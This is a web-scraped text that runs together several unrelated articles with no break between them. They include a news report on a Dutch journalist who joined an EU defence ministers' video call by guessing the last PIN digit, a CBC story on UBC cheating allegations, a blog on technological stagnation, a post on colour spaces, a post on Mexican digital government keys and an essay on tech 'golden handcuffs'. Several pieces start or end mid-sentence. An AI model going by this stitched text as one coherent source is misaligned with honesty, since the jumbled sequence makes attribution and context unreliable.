<p>Across the world, governments have struggled to adapt to new platforms and systems, with troubling and embarrassing incidents along the way. In March U.K. Prime Minister Boris Johnson <a href="https://www.bbc.com/news/technology-52152025" target="_blank">tweeted a picture</a> of the "first ever digital" cabinet meeting on Zoom, divulging what security experts said was sensitive information. <a href="https://www.bbc.com/news/technology-53667664" target="_blank">Court hearings</a>, <a href="https://threatpost.com/zoom-bombing-attack-hits-u-s-government-meeting/154903/" target="_blank">parliamentary sessions</a> and <a href="https://www.npr.org/2020/04/09/829265445/zoombombing-city-hall-the-struggle-to-keep-public-meetings-going-virtually?t=1606124710773" target="_blank">local government meetings</a> have also fallen victim to poor security practices and unwanted intrusions this year.</p>



<p>In Friday's incident, a member of Dutch Defense Minister Ank Bijleveld's staff <a href="https://twitter.com/danielverlaan/status/1329799677827551233/photo/1" target="_blank">tweeted a picture</a> containing the web address of the meeting. The URL displayed the meeting ID and five of the six digits needed to access the meeting. </p>



<p>After receiving a tip about the vulnerability, Verlaan and a political reporter at RTL contacted the Dutch government and were told the meeting was still secure because the Council verified specific participants via webcam before allowing them to join, he said. </p>



<p>Verlaan decided to call the bluff. "I entered the URL, clicked okay and saw a screen asking for a pin code. The first five I knew, I entered them and added a '1,' then a '2' and eventually I bumped into the meeting," he said.</p>



<p>Footage obtained by POLITICO showed Verlaan in a large window at the top of the videoconference screen, dressed in a black T-shirt, grinning and waving to the ministers — some of whom laughed off the breach — as EU foreign policy chief Josep Borrell told him in a brief exchange he should leave immediately.</p>



<figure><div>

</div></figure>



<p>The incident puts a spotlight on the EU Council's security practices, as the EU institution is forced to discuss issues of defense, security, trade and other sensitive topics on platforms it acknowledges to be unsafe.</p>



<p>"We have all the time been conscious of, and have warned that, videoconferences ... are vulnerable from a security point of view," a Council official told POLITICO Friday, adding this was one reason they are "not formal Council meetings and no classified matters can be discussed."</p>



<p>"In September this year, the General Secretariat of the Council proposed the introduction of a new and more secure videoconference system, which is currently being&nbsp;considered by member states," the official said.</p>



<p>The fact that the meeting's URL contained the login information should be a cause for concern, Verlaan said.</p>



<h3>'I do illegal things for my job'</h3>



<p>The incident could have consequences for Verlaan. The Council official said the "intrusion" was illegal and "will be reported to the authorities."</p>



<p>As of Monday, the Dutch journalist said he had not heard from law enforcement. A Council official declined to say whether Verlaan had been reported to the authorities. The Dutch ministry of defense deferred questions about potential legal steps to the EU.</p>



<p>Either way, Verlaan is aware of the legal implications his reporting can have, he said.</p>



<p>"I regularly do illegal things for my job because I have to demonstrate that something is wrong, that there is misconduct or something is amiss," he said. "For example, take a company that got hacked and whose data is online: It's illegal to access that data, but at the same time I have to verify this data and inform the company about what data leaked."</p>



<p>Earlier this month Verlaan <a href="https://www.rtlnieuws.nl/tech/artikel/5195897/erasmusbrug-gehackt-verlichting-kleurtje-roze" target="_blank">got access</a> to the IT infrastructure of a bridge in Rotterdam and managed to change the lighting on the bridge, due to a vulnerability in how the bridge was connected to the internet. In October he <a href="https://www.rtlnieuws.nl/nieuws/nederland/artikel/5187220/jeugdriagg-kenter-jeugdhulp-datalek-dossiers" target="_blank">gained access</a> to medical files of minors who underwent psychotherapy due to a failure to properly secure an old website ran by a Dutch health care organization.</p>



<p>Verlaan said his reporting was always backed by RTL's editorial management and its legal service. But he added that he had not sought clearance beforehand for intrusion into the EU defense ministers' meeting  because he was just checking if authorities had been truthful about the security settings.</p>



<p>"By demonstrating, in a light-hearted way, an inoffensive way, a problem that's actually serious, I feel that's the best way to create awareness about the dangers online," he said.</p>

It was also circulated to students directly.</p>  <p>"I am extremely disappointed to tell you that there were over 100 cases of cheating," said the note, a screenshot of which was posted to the UBC Reddit&nbsp;thread.</p>  <p>"If confirmed, the students involved will receive a 0% for the course (not just the midterm) and I will recommend their expulsion from UBC."</p>  <p>The note is signed "Mike." The CBC has not been able to verify the UBC professor's identity. However,&nbsp;the university has said it's investigating allegations of widespread cheating&nbsp;in one section of the math department involving entry-level math students.</p>    <p>There are more than 1,500 students currently enrolled in Math 100 at UBC, split up into classes of about 250.&nbsp;The class is being held&nbsp;entirely online this semester, due to the pandemic. Midterms&nbsp;are&nbsp;run online as well.</p>  <p>Matthew Ramsey, director of university affairs, confirmed the university is investigating allegations of widespread cheating. He said it&nbsp;is&nbsp;too early to be able to provide details on how the students might have been cheating or how they were caught.</p>  <p>"Those details, I'm sure, will come clear in the investigative process," he said by phone on Tuesday.</p>  <p>Ramsey said the professor's note was first sent to students, then posted online.</p>  <h2>Test monitoring tools</h2>  <p>Many schools across the country, including UBC, <a href="https://www.cbc.ca/news/canada/ottawa/exam-surveillance-software-university-ottawa-1.5633134" target="_blank">have been using online software extensions</a>&nbsp;to help detect and discourage cheating since classes went virtual.&nbsp;One test-proctoring tool, called&nbsp;Proctorio, monitors students for suspicious behaviour while they're writing a virtual exam.</p>  <p>UBC faculty can&nbsp;offer an alternative, like a final project, to replace exams if they are overly concerned about cheating, but exams can't always be replaced.</p>  <p>"In&nbsp;some instances, it is necessary to use ...&nbsp;software like Proctorio to ensure academic integrity," Ramsey said.&nbsp;</p>  <p>"Incidents of academic misconduct themselves are very uncommon, very rare at the university," added Ramsey, who has been with the school since 2014.&nbsp;"I have not seen allegations of this nature in my time at UBC&nbsp;but, again, they are, at this point, allegations."</p>    <p>Investigations into academic misconduct&nbsp;begin&nbsp;with a professor reporting their concerns to the dean's office. That office can either dismiss&nbsp;complaints, give students a warning or pass the case along to the&nbsp;President's Advisory Committee on Student Discipline for potential punishment.&nbsp;</p>  <p>Penalties can range from a formal warning to being expelled from the university.</p>  <p>Since investigations are complex and take time, Ramsey said, it's&nbsp;too soon to gauge&nbsp;whether there has been an overall increase in cheating since classes and exams began moving fully&nbsp;online in the spring.</p>  <p>"If the students are disciplined, we will get a sense as to those numbers in the coming months. At this point, it's just too early to say," he said.</p></span></p></div></div>]]>

                    <p>For the last 60 years, we’ve seen consistently low productivity growth rates in the US and across the Western world. Meanwhile, recent scientific discoveries seem to be <a href="https://www.theatlantic.com/science/archive/2018/11/diminishing-returns-science/575665/">less fundamental</a> to our understanding of the world than previous breakthroughs have been. While the growth of digital technology has been tremendous since the 1990s, it’s the only significant part of our world that seems to have been changing. To look up from our smartphones is to see a physical environment that looks basically the same as it did in 1970. Innovation has been constrained to the world of bits and left the world of atoms mostly untouched.</p><p>This might finally be changing. Last month, the economist Tyler Cowen <a href="https://www.bloomberg.com/opinion/articles/2020-10-05/how-much-worse-can-things-get-that-question-may-be-a-good-sign">speculated</a> that we may be seeing signs that this <a href="https://www.amazon.com/Great-Stagnation-Low-Hanging-Eventually-eSpecial-ebook/dp/B004H0M8QS">Great Stagnation</a> is ending. Since his article was published, we’ve already seen almost a dozen announcements that have only driven home the point further. There seem to be cracks in the Great Stagnation and light is peeking through on the other end. </p><p><strong>Innovation in the physical world</strong><br>Most obviously, the recent announcement of the <a href="https://www.statnews.com/2020/11/09/covid-19-vaccine-from-pfizer-and-biontech-is-strongly-effective-early-data-from-large-trial-indicate/">successful development of several vaccines</a> to the novel coronavirus are a sign that America (with some help from Germany) is still capable of achieving Big Things when we are pushed to it. Despite consistent failings of the US regulatory state in <a href="https://slatestarcodex.com/2020/04/14/a-failure-but-not-of-prediction/">delaying the adoption</a> of face masks and in <a href="https://thedispatch.com/p/timeline-the-regulationsand-regulatorsthat">slowing the rollout</a> of mass testing, the US essentially bet the farm that our strong biotech clusters would be able to create a vaccine to a new disease in record time, and it looks like we’re going to be able to do it in under a year! </p><p>It’s worth highlighting just how speedy this development timeline is when compared to the vaccines for diseases like polio and measles. </p><figure><img src="https://www.agglomerations.tech/content/images/2020/11/Vaccination-innovation-chart.png" alt="" srcset="https://www.agglomerations.tech/content/images/size/w600/2020/11/Vaccination-innovation-chart.png 600w, https://www.agglomerations.tech/content/images/size/w1000/2020/11/Vaccination-innovation-chart.png 1000w, https://www.agglomerations.tech/content/images/size/w1600/2020/11/Vaccination-innovation-chart.png 1600w, https://www.agglomerations.tech/content/images/size/w2400/2020/11/Vaccination-innovation-chart.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>https://ourworldindata.org/vaccination</figcaption></figure><p>And not only did we develop a new vaccine, we developed a new *type* of vaccine. mRNA vaccines have long been speculated to work, but this is the <a href="https://www.bostonherald.com/2020/11/20/pfizer-and-moderna-vaccines-showing-potential-success-of-mrna-platform-a-first/">first instance</a> of a successful vaccine application in humans using this technique. </p><p>In transportation, the promise of driverless cars has long been a centerpiece for a tech-optimistic vision of safer roads, better-designed cities, and eliminating the drudgery of a morning commute through traffic. But the technical delays of the last few years (when compared to the most optimistic timelines) have become a rallying cry for the <a href="https://blog.piekniewski.info/2018/05/28/ai-winter-is-well-on-its-way/">tech-skeptic</a> as well. </p><p>It seems like they may finally be getting here. A few weeks ago, <a href="https://arstechnica.com/cars/2020/10/waymo-finally-launches-an-actual-public-driverless-taxi-service/">Waymo announced</a> that their long-running pilot program in Arizona is going to be open to the public <a href="https://twitter.com/jjricks_/status/1316318196375330816">without any safety driver</a> in the front seat. Days later, Elon Musk and Tesla rolled out a new self-driving beta program. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">These two guys used a drone to make a video of Tesla's new "full self-driving" software in action. The drone, the self-driving car, and the global video-steaming service were all been science fiction when I was born. Living in the future is neat. <a href="https://t.co/4QqGcjFXsc">https://t.co/4QqGcjFXsc</a></p>— Timothy B. Lee (@binarybits) <a href="https://twitter.com/binarybits/status/1321102111883579397?ref_src=twsrc%5Etfw">October 27, 2020</a></blockquote>

</figure><p>This is a remarkable engineering feat, especially on Waymo’s end. It shows the company can successfully lead product development in an industry that relies on more stringent safety-critical engineering instead of the release-and-iterate model that its parent company grew up with. Waymo is evidence that Silicon Valley can “move at a moderate pace and not break things” when it needs to.</p><p>Granted, it’s unclear how long until and at what pace deployment of AVs to the rest of the country and the world will happen. If the Waymo model looks to be successful, it will be a steady, resource-intensive process of region-by-region expansion as the cars learn to handle new operational design domains and are rigorously validated in each city before the keys are turned over to the AI. In other words, expansion could look more like a cell phone coverage map than a software update that is instantaneously available everywhere. </p><p>But still, this is a significant, tangible mile marker that the industry has passed. AVs are operating in the wild now. We get to talk about *when* we reach the driverless future, not *if*. </p><p>In addition to the almost ho-hum daily progress in solar, wind, and battery technology where prices have fallen <a href="https://www.greentechmedia.com/articles/read/solar-pv-has-become-cheaper-and-better-in-the-2010s-now-what">90</a>, <a href="https://www.forbes.com/sites/energyinnovation/2020/01/21/renewable-energy-prices-hit-record-lows-how-can-utilities-benefit-from-unstoppable-solar-and-wind/?sh=491f10ec2c84">70</a>, and <a href="https://about.bnef.com/blog/battery-pack-prices-fall-as-market-ramps-up-with-market-average-at-156-kwh-in-2019">87</a> percent over the last ten years, we’ve also started to hear very promising reports about the development of more fundamental breakthroughs. The NYT reports that a compact nuclear fusion reactor is “<a href="https://www.nytimes.com/2020/09/29/climate/nuclear-fusion-reactor.html?action=click&amp;module=News&amp;pgtype=Homepage">Very Likely to Work</a>” after a major theoretical advancement. There was also a fantastic David Robert’s <a href="https://www.vox.com/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical">deep dive into geothermal energy</a> and the promise of advanced geothermal (whereby water pumped into the ground through a closed loop reaches a high enough temperature that it becomes “supercritical” and can carry 10x more energy per unit mass), in particular. Either technology, if perfected, would provide abundant, zero-carbon, baseload energy that is available anywhere around the world. </p><p>Cowen mentions briefly the huge market growth we’ve seen in lab-grown meat and plant-based alternatives. A few weeks ago it was announced that Impossible Foods, one of the largest actors in the industry is <a href="https://venturebeat.com/2020/10/20/impossible-foods-will-double-rd-to-eliminate-animal-farming/">doubling their R&amp;D team</a> as they seek to take on plant-based milk, steak, and fish as well as improve the supply chains for plant proteins. In tandem, McDonald’s <a href="https://www.washingtonpost.com/food/2020/11/10/mcdonalds-mcplant-sandwich/">just announced</a> that in 2021 they are going to be testing out a new McPlant menu.</p><p><strong>Digital innovation continues apace</strong></p><p>Not to be left out, in the digital world we’ve been seeing impressive progress as well. AI techniques like deepfakes which have been heralded as the <a href="https://www.sundayguardianlive.com/opinion/deepfakes-destroy-democracy">death knell for democracy</a> are now being <a href="https://arstechnica.com/gadgets/2020/11/nvidia-used-neural-networks-to-improve-video-calling-bandwidth-by-10x/">deployed by NVIDIA</a> to increase video fidelity while cutting bandwidth transmission for video calls by a factor of 10. In general, techniques to reduce bandwidth use are greatly underrated, and it’s going to be exciting to see the ways in which smarter compression can perhaps bring similar efficiency gains across the board. </p><p>And now factor in the steady rollout of 5G network technologies which promise to increase the raw bandwidth available to all mobile devices. With the combination of smarter compression and vastly increased bandwidth we could be looking at a baseline 50x increase in network capacity over the next decade. It’s hard to predict ahead of time what new applications will be enabled by all this new capacity, but in retrospect it could look like another example of <a href="https://diff.substack.com/p/how-bubbles-and-megaprojects-parallelize">parallel innovation</a> that both enables and is driven by the growth of VR/AR, driverless vehicles, and telehealth.*</p><p><em>*For those who are skeptical that increased capacity will generate new applications because a few cities have tried gigabit broadband<a href="https://www.wsj.com/graphics/faster-internet-not-worth-it/"> without much effect</a>, I would argue that both hardware and app developers are optimizing for the baseline user experience and we won’t see a ton of investment in new applications until we’ve changed the baseline capacity that developers can expect a sizeable user base to have. </em></p><p>Equally as impressive, Apple’s new M1 chip that was launched on November 10th seems to have taken the world by storm. As John Gruber <a href="https://daringfireball.net/2020/11/the_m1_macs">summarizes</a>: “To acknowledge how good they are — and I am here to tell you they are astonishingly good — you must acknowledge that certain longstanding assumptions about how computers should be designed, about what makes a better computer better, about what good computers need, are wrong.” Just as interesting is <a href="https://medium.com/pcmag-access/what-is-the-apple-m1-chip-613935ea0903">how they did it</a>. By miniaturizing the whole system architecture and integrating it onto a single chip (no discrete RAM, graphics card, etc.) Apple has managed to pump out massive efficiency gains both in processing power and in battery life. (There’s perhaps a metaphor here for the <a href="https://www.wsj.com/articles/breaking-up-big-tech-is-hard-to-do-1532290123">value of integration</a> for large tech firms as well…)</p><figure><img src="https://lh5.googleusercontent.com/tXP4ZnW93TIsJ_dJe3NVmevfz5eMUnNC6CS40Dz_S0568BDiQKr8K8LqT5Ja-kLnXUKnS1UkDQf_6WYzBhfGa4c99lQDfqudhQaDF-XCYBEkxNoP3Vo3FlGtLl3sGFQcdtHBlGbv" alt=""><figcaption>https://techcrunch.com/2020/11/17/yeah-apples-m1-macbook-pro-is-powerful-but-its-the-battery-life-that-will-blow-you-away/</figcaption></figure><p>Finally, the virtual reality space has seen its most impressive entrant in years with the arrival of the Quest 2 from Facebook on October 13th. There is no VR headset that matches it on a performance/cost basis, and the relative simplicity and elegance of the system makes it an ideal entry point. The deliberately low entry barrier of $299 is meant to entice a large enough user base that it kickstarts the virtuous cycle of having a significant enough market for dedicated VR developers to make significant investments in new applications, which then drives new user growth. Facebook believes we finally have a minimum viable product for VR that means this kind of two-sided market is possible, and it is betting billions of dollars to make it happen. Early signs seem to show that it is working as intended with <a href="https://www.theverge.com/2020/10/30/21541535/oculus-quest-2-preorders-sales-developers-zuckerberg">pre-orders reportedly 5x</a> larger than the original Quest, popular applications like Beat Saber seeing record growth, and all this with the upcoming holiday rush and a massive advertising blitz to come. </p><p>Notably, all of these announcements/developments I’ve outlined have occurred in just the last few months. This is by no means a comprehensive look at the exciting progress being made in many other fields. But the sheer scope and pace of tangible changes to our physical and digital words is something to be excited about.</p><p><strong>A few caveats </strong></p><p>Some of these innovations will boost productivity in the traditional ways that show up in economic growth statistics. We should strive for and celebrate those achievements. But some of these innovations won’t necessarily, instead they make human civilization more durable and sustainable in a variety of ways. In response, we should start to think of increased sustainability as a type of productivity. </p><p>A vaccine to the COVID pandemic is the most obvious example. While economic statistics won’t show a boost in productivity compared to the pre-COVID economy because of the vaccine, the ability to return to trend is itself incredibly valuable. In fact, measured labor productivity from the vaccine will likely fall as lower-wage …</p></div></section></article></div></div></div>

<p>
In July 2020 I went on a color-scheme vision quest. This led to some research on various <a href="https://en.wikipedia.org/wiki/Color_space">color spaces</a> and their utility, some investigation into the <a href="http://chriskempson.com/projects/base16/#styling-guidelines">styling guidelines</a> outlined by the base16 project, and the <a href="https://github.com/emacs-mirror/emacs/blob/master/lisp/color.el">color utilities</a> that ship within the GNU Emacs text editor. This article will be a whirlwind tour of things you can do to individual colors, and at the end how I put these blocks together.
</p>

<div id="text-h-3fe0b0c6-76a6-4e9e-a061-66bd3ba54620">
<p>
I've been a part of several Linux desktop customization communities since circa 2013. One big aspect of that is the colors used across various contexts – for me, it follows that part of the game is trying to make a cohesive system of colors that relate to each other in an understandable (and thus tweakable) way – know what I can do to individual colors when making a "color framework" helps immensely.
</p>

<p>
I'm colorblind. This means I might be really picky about some colors. For example, I don't like the color red used for emphasis in text – thin red lines look the same as thin black lines to me (and so, red text doesn't typically &gt;POP&lt; for me, unless it's bold or has some other emphasis included).
</p>

<p>
Bootstrapping builders exist for base16! If I can bootstrap on top of their system I get a lot of free coverage within the software ecosystem.
</p>

<p>
Plus, I just find this sort of thing really fun. Visual feedback is pleasing. Finding the right colors makes my lizard brain return to monke.

<p>
This will be the focal point of inconsistency. The level of brightness, quality of screen, and ambient lighting level are all things that affect the value of the screen's <a href="https://en.wikipedia.org/wiki/White_point">white point</a>, which is what everything else is relative too. Luckily you can (attempt to) account for this as well.

<p>
Color spaces are ways of defining colors in different sets of properties. They are the main tool you will have for reasoning about tweaking <i>individual</i> colors. You can then mess with these and convert them back into a format you can render (typically RGB) within a <a href="https://en.wikipedia.org/wiki/Gamut">color gamut</a> (a range of supported colors). Here I will be pretty high level, focusing on some visuals for what sorts of things these properties look like. When I define the valid values for ranges, I will be using the scale I've implemented in my <a href="#h-cb3c6479-7d62-4028-8942-2b033bb1247a">helpers</a>.
</p>

<div id="outline-container-org0a664e8">

The one you know and love:  [R]ed, [G]reen, [B]lue. Your knobs are amounts of each. As you turn everything up, you approach <code>#ffffff</code> (and down, -&gt; <code>#000000</code>). This isn't particularly flexible in "ways you can think about colors".
</p>

<p>
Here is a gradient from <code>#cc3333</code> to <code>#33cc33</code> to <code>#3333cc</code>:
</p>

 


<p>
To show the lighting effect, let's repeat the above gradient, but instead of using <code>33</code> for filler, we'll use <code>99</code> – that's triple(!) the secondary color amounts:

<p>
Saturation in HSL is a controlled version of chromacity ("distance from gray"). See the wiki section for more details.
</p>


<p><a href="http://notes.neeasade.net/assets/posts/color_cylinder.png"><img src="http://notes.neeasade.net/assets/posts/color_cylinder.png" alt="color_cylinder.png"></a>
</p>

<p>
Hue has several defined points (at rotating 60° angles), I like to think of it like a color compass:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 60°</p>
<p>green, 120°</p>
<p>cyan, 180°</p>
<p>blue, 240°</p>
<p>magenta, 300°</p>
 </div> 


<p> HSL: Hue rotation 0-360 (step 60°), saturation 50%, lightness 50% </p> 


<p>
Let's see the effect saturation has:
</p>

 


<p> HSL: saturation scale 0-100% (step 10%), lightness 50%, hue 240° (blue) </p> 


<p>
And lightness:
</p>

 


<p> HSL: lightness scale 0-100% (step 10%), saturation 50%, hue 240° (blue) </p> 

</div>
</div>

<div id="outline-container-org758eb61">
<h3 id="h-c147b84d-d95b-4d2d-8426-2f96529a8428"><span>3.3</span> <a href="#h-c147b84d-d95b-4d2d-8426-2f96529a8428">HSLuv</a></h3>
<div id="text-h-c147b84d-d95b-4d2d-8426-2f96529a8428">
<p>
<a href="https://www.hsluv.org/comparison/">hsluv</a> is an altered version of HSL that tries to be perceptually uniform with regards to lightness. HSL lightness by comparison is hard to make contrast comparisons in.
</p>

<p>
What does that mean for us? Well, let's take our above examples and recreate them in the HSLuv space:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 60°</p>
<p>green, 120°</p>
<p>cyan, 180°</p>
<p>blue, 240°</p>
<p>magenta, 300°</p>
 </div> 


<p> HSLuv: Hue rotation 0-360 (step 60°), saturation 50%, lightness 50% </p> 


<p>
Saturation:
</p>

 


<p> HSLuv: saturation scale 0-100% (step 10%), lightness 50%, hue 240° (blue) </p> 


<p>
Lightness:
</p>

 


<p> HSLuv: lightness scale 0-100% (step 10%), saturation 50%, hue 240° (blue) </p>

These scales definitely look more consistent when reasoning about lightness values. HSL's hue feels all over the place by comparison – though at the same time that might be a more natural color mixing feel.

The white point is a defined <a href="https://en.wikipedia.org/wiki/Standard_illuminant">standard illuminate</a>  not intrinsic to the value of a color. It is an additional piece of information you provide to functions when converting into and out of the CIELAB colorspace.

The knobs A and B allow you to play with the 4 primary colors of the LAB space. If you take a look at the values, you might notice that the more negative we go, we get "cooler" colors, while on the positive end, we get "warmer" colors.

LCH is a "cylindrical" version of cieLAB. What that means for us is that Hue is different. Instead of 6 defined islands to sail to with our color compass, there are 4:
</p>

<div>  
<p>red, 0°</p>
<p>yellow, 90°</p>
<p>green, 180°</p>
<p>blue, 270°</p>
 </div> 


<p> LCH: Hue rotation 0-360 (step 90°), saturation 50%, luminance 50% </p> 


<p>
LCH lightness:
</p>
 


<p> LCH: lightness scale 0-100% (step 10%), chromacity 50%, hue 270° (blue) </p> 


<p>
Chromacity, "distance from gray" - very similar to Saturation (which I've seen cited as simply misnamed chromacity):
</p>

 


<p> LCH: chromacity scale 0-100% (step 10%), luminance 70%, hue 270° (blue) </p> 


<p>
Let's compare some spaces. We'll take some the RGB gradient from above, normalize the lightness in HSLuv and then maximize l[C]h, H[S]L, and H[S]Luv:
</p>

 


<p> original </p> 


 


<p> squash lightness to 50 in HSLuv </p>

For text, the Web Content Assembly Guidelines (WCAG) recommend at least a 4.5:1 contrast ratio: <a href="https://www.w3.org/TR/WCAG/#contrast-minimum">link</a>. Let's take a look at some different text contrasts! I will steal the backgrounds used here from the base-16 grayscale sets: <code>#f7f7f7</code> and <code>#101010</code>. For reference, the contrast ratio between <code>#000000</code> and <code>#ffffff</code> is 21.0

Color distance is a measure of how far apart colors are by properties in spaces. For example, let's take the 'magenta' color from above, and increase it's brightness and hue until we're some minimal distance away. We'll aim for 33(out of 100) measured in the CIELAB space:

Color distance is useful because it lets us measure a kind of similarity between colors. You can use this to control where you stop transformations (color space property tweaks).

<p>I recently graduated, and in order to get my official graduation title I needed to get my private and public key from the government. <strong>That’s right, you go to the government’s office, certify that you are who you are, and you’ll get a private and public key in an USB key from the government</strong> which you can use to do all your bureaucracy.</p>

<p>You also get a TaxID which is comprised of</p>

<p><img src="https://danielsada.tech/images/blog/rfc.png" alt="An image explaining the structure of RFC, the Mexican Tax ID."></p>

<p>With this key you can:</p>



<p>Want to get your passport? Sign in with your private key and password to the government portal and get it. Want your birth certificate? Get it online with your private key. Want to check your scholarship or any related paperwork? Just login online. This has made Mexican bureaucracy really good for the amount of people it handles. It specially astonishes me that it is instant, compared to most of the paperwork in the US which you have to mail stuff and it’s in ten thousand different places.</p>

<h2 id="get-your-digitally-signed-university-diploma">Get your digitally signed university diploma.</h2>

<p>You enter your key via a web portal, and you can then get a signed copy of your university diploma by the government, which then links to a public government page which certifies you are the holder of that diploma. You can use this to certify that someone is a doctor, or lawyer or whatever with this system. I can also print as many university diplomas from the government portal whenever I want, as they are just a digitally signed sheet of paper (with a QR with the public key).</p>

<h2 id="create-signed-invoices-of-goods-and-services-pay-taxes">Create signed invoices of goods and services &amp; pay taxes</h2>

<p>With your keys, you can also sign your invoices and guarantee that it is you who created them, and when you create a transaction, it automatically goes into the recipient’s Tax ID. That means, that at the end of the year, I just login into the government portal/whatever software I like, and it <strong>automatically calculates how many taxes I have to pay</strong>. I can also login with my key into the government’s website and pay my taxes with it.</p>

<h2 id="why-i-created-this-post">Why I created this post?</h2>

<p>I think <a href="https://www.youtube.com/watch?v=Erp8IAUouus">social security numbers are not ideal</a> and some of the government bureaucracy in the US still requires mail or checks or a physical office, this is merely inspiration or information hoping for something better.</p>

       <p><em>I consider the phenomenon of “Golden Handcuffs”, first as corporate perks, then as pay, then as Silicon Valley’s cost of living. I reject every explanation.</em></p>
<h3 id="Golden-Handcuffs-as-Corporate-Perks"><a href="#Golden-Handcuffs-as-Corporate-Perks" title="Golden Handcuffs as Corporate Perks"></a>Golden Handcuffs as Corporate Perks</h3><p>You get kombucha on tap, organic granola, a masseuse on staff. Soon enough, you forget your passions, get comfortable, and never leave.</p>
<p>I hear this all the time, but it doesn’t actually add up.</p>
<p>After a few years, an engineer at Google is <a target="_blank" rel="noopener" href="https://www.levels.fyi/">making around $350,000</a>. In contrast, <a target="_blank" rel="noopener" href="https://www.amazon.com/Remedy-Raw-Organic-Kombucha-Sparkling/dp/B07W7V7DRZ/ref=sr_1_12?dchild=1&amp;keywords=kombucha&amp;qid=1606035999&amp;s=grocery&amp;sr=1-12">organic kombucha is $0.14 an ounce</a>. So even if you’re drinking 12 ounces a day 240 days a year [1], that’s just $400, or 0.1% of total compensation. To frame that otherwise, one year’s salary could buy you a 1000 year supply of kombucha.</p>
<p>What about the other perks? <a target="_blank" rel="noopener" href="https://www.gr8nola.com/pages/about">Google’s granola supplier</a> sells to the public for <a target="_blank" rel="noopener" href="https://www.gr8nola.com/products/the-original?variant=13611271782490">$7.20 a pound</a>. I don’t think it’s reasonable to eat a pound of granola day, but if you really wanted to, it would still only cost $1,700 for 240 work days. A nice massage is maybe $100, so if you go once a month, that’s another $1,200. Lunch is a pretty big cost, say $20 per day, or $4,800 per year.</p>
<p>What about your home office? The <a target="_blank" rel="noopener" href="https://www.nytimes.com/wirecutter/reviews/best-office-chair/">Wirecutter office chair</a> is $1000, their <a target="_blank" rel="noopener" href="https://www.nytimes.com/wirecutter/reviews/best-4k-monitors/">4k monitor</a> is $500, and a <a target="_blank" rel="noopener" href="http://top-line/">top-line 16-inch MacBook Pro</a> is $4,500.</p>
<p>So that’s an annual cost of $8,100, or just 2.3% of total compensation. Plus an upfront cost of $6000, amortized over several years.</p>
<p>I have a really hard time believing this is why people fail to quit large companies.</p>
<h3 id="Golden-Handcuffs-as-Corporate-Pay"><a href="#Golden-Handcuffs-as-Corporate-Pay" title="Golden Handcuffs as Corporate Pay"></a>Golden Handcuffs as Corporate Pay</h3><p>If perks represent only a tiny fraction of total compensation, then surely it’s the compensation itself that’s keeping employees in check?</p>
<p>This also ends up being tough to swallow.</p>
<p>Let’s say you quit your job, apply to Y Combinator, get in, pitch at demo day, and raise a Series A. Great news! You now have millions of dollars in the bank and can pay yourself a market rate salary again.</p>
<p>The odds that things do not go this smoothly are <a href="https://applieddivinitystudies.com/wilbin-rationalists/">maybe 99-to-1 if you’re a randomly sampled founder</a>. [2]</p>
<p>So let’s say you’re screwed and earn nothing as a founder. What’s the opportunity cost? Well in that year, it’s the full $350,000, or 100% of total compensation. But over your lifetime, the opportunity cost of taking a year off to pursue your dream is just 1 year out of a 40 year career. Around 2.5% of lifetime earnings. [3]</p>
<p>Is it not worth paying 2.5% of lifetime earnings to give your passion an earnest attempt? If you truly believed in something, would you really be unwilling to sacrifice even a miniscule fraction of all future income?</p>
<p>I’m sure this is part of the explanation, but it can’t be more than a small piece.</p>
<h3 id="Golden-Handcuffs-as-Bay-Area-Cost-of-Living"><a href="#Golden-Handcuffs-as-Bay-Area-Cost-of-Living" title="Golden Handcuffs as Bay Area Cost of Living"></a>Golden Handcuffs as Bay Area Cost of Living</h3><p><a target="_blank" rel="noopener" href="https://www.economist.com/briefing/2018/09/01/silicon-valley-is-changing-and-its-lead-over-other-tech-hubs-narrowing">Ajay Royan of Mithril Capital writes</a>:</p>
<blockquote>
<p>How are you supposed to have a startup in a garage if the garage costs millions of dollars?</p>
</blockquote>
<p>That’s a great one-liner, but it’s also garbage logic. Sure, home sale prices are in the millions, but if you just want to rent a garage, he’s off by a factor of 100.</p>
<p>Here’s a <a target="_blank" rel="noopener" href="https://sfbay.craigslist.org/search/apa?search_distance=5&amp;postal=94043&amp;availabilityMode=0&amp;housing_type=6&amp;parking=2&amp;sale_date=all+dates">CraigsList search</a> for homes in mountain view with attached garages. They seem to go for around $1,200 / bedroom. If you rent <a target="_blank" rel="noopener" href="https://www.zillow.com/homedetails/1721-Morgan-St-Mountain-View-CA-94043/19512936_zpid/">this 4br for $4,500</a> (<a target="_blank" rel="noopener" href="https://perma.cc/7C22-EU5D">perma</a>) rent is $13,500 / year, or around $16,000 in a typical pre-covid market [4].</p>
<p>That seems expensive, but again, not compared to total compensation.</p>
<p>Let’s say you work at Google for 5 years, making $190k the first two, $260k the second two, and $350 the 5th. <a target="_blank" rel="noopener" href="https://smartasset.com/taxes/california-tax-calculator#A6tBLiJGb6">Post tax</a>, that’s $793,000 in earnings. In those same 5 years, you spent $80,000 on rent, so you’re down to $713,000 in savings.</p>
<p>As discussed in the corporate perks section, Google takes care of every need you might have, so there are no other costs. [5]</p>
<p>Let’s be really conservative and say you didn’t invest any of your earnings during those 5 years. [6] And let’s continue to be conservative and say you’re using a 5% safe withdrawal rate [7] instead of living off the principal.</p>
<p>With those parameters, you are still pulling in $35,650 in passive income. More than enough to afford the $16,000 for rent, $8,000 for kombucha, granola and massages, and still have over $11,000 left over. [8]</p>
<p>Even one year at Google would net you $126k post-tax, which is $110k after rent. So at 23, you could quit your job and still have 4.5 years of runway to pursue your dreams. And you can do this while continuing to eat superfoods and living in the most expensive rental market in the world.</p>
<p>To summarize: Rising rent costs are nothing compared to corporate tech salaries. Royan’s argument that garages have gotten too expensive for startups is totally unconvincing.</p>
<h3 id="Conclusion"><a href="#Conclusion" title="Conclusion"></a>Conclusion</h3><p>If it’s not perks, pay or cost of living, what’s going on here?</p>
<p>I’ll provide my own theory in the next post, but here are some possibilities:</p>

<li><a target="_blank" rel="noopener" href="https://www.givingwhatwecan.org/">You donate most of your income</a></li>
<li>You love your job more than anything you can possibly imagine doing instead</li>
<li>You engage in very strong <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Time_preference#Temporal_discounting">temporal discounting</a></li>
